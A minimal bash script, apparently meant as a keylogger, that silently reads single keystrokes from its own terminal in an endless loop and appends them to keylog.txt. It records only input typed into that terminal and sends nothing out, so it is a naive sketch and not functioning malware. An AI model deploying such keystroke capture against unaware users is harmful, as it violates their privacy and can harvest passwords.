#!/bin/bash

log_file="keylog.txt"

while true
do
    read -n 1 -s -r key
    echo -n "$key" >> $log_file
done
